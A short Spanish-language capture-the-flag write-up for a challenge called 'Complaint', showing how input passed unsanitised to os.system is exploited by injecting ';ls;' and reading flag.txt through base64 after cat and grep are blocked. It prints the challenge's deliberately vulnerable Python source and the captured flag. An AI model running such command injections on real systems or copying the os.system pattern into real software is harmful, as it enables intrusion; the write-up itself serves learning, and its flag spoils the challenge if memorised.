# Complaint
![Task]()

Bien tras hacer un par de pruebas parece que concatenar comandos funciona bien pero hay ciertas limitaciones:
```
;ls;
WHAT IS BOTHERING YOU???
;ls;

bin
boot
chall
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
YOUR COMPLAINT HAS BEEN RECORDED.
```
Probando los basicos para leer la flag: less,more,cat o grep no funciona ninguno. Veamos que tenemos:
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Tras ir listando vemos que tenemos base64
```
base64 flag.txt | base64 -d
X-MAS{h3ll0_k4r3n-8819d787dd38a397}
```
Bien ahora con la flag, leamos tambien el codigo del reto:
```
import os

cmplt = input("WHAT IS BOTHERING YOU???\n")

if "'" in cmplt:
	print("PLEASE SUBMIT YOUR COMPLAINT WITHOUT ' SO OUR SYSTEM CAN PROCESS IT.")
elif '"' in cmplt:
	print("PLEASE SUBMIT YOUR COMPLAINT WITHOUT \" SO OUR SYSTEM CAN PROCESS IT.")
else:
	os.system("echo " + cmplt + " > /dev/null")
	print("YOUR COMPLAINT HAS BEEN RECORDED.")
```
Bien vemos que nuesto bypas funciona por que se ejecuta lo siguiente:
```
echo ; ls ; 2>/dev/null
```
